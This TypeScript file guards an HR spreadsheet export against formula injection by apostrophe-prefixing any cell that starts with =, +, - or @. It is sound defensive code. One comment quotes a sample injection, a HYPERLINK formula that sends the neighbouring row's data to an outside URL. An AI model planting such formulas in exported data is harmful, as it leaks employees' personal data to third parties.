/**
 * BR-IMP-010's first clause: *"any cell value starting with `=`, `+`, `-`, `@`
 * is apostrophe-prefixed on write."*
 *
 * ADR-0015 states the threat plainly — spreadsheet formula injection is a real
 * exfiltration vector in HR data. A cell reading `=HYPERLINK("https://…?d="&A2)`
 * is not a string an employee typed into their address field; it is a request
 * that whoever opens the export send the row next to it somewhere. The leading
 * apostrophe is Excel's own "this is text", stored in the cell and not shown.
 *
 * **Applied on write, never on read.** The stored value is what the employee
 * entered and the export is where it becomes dangerous, so guarding at the
 * source would corrupt the database to protect a file. §14 asserts this at the
 * byte level for exactly that reason: it is invisible in every viewer.
 */

/** The four characters the rule names — no more, and the list is not ours to grow. */
const DANGEROUS = /^[=+\-@]/;

export function guardCell(value: string): string {
  return DANGEROUS.test(value) ? `'${value}` : value;
}

/**
 * The same guard applied to whatever a query port yielded.
 *
 * Numbers and booleans pass through as themselves — a number cannot begin with
 * `=`, and stringifying it would put quoted text where a spreadsheet expects a
 * value people will sum. `null` becomes an empty cell rather than the word.
 */
export function guardValue(
  value: string | number | boolean | null,
): string | number | boolean | null {
  return typeof value === 'string' ? guardCell(value) : value;
}
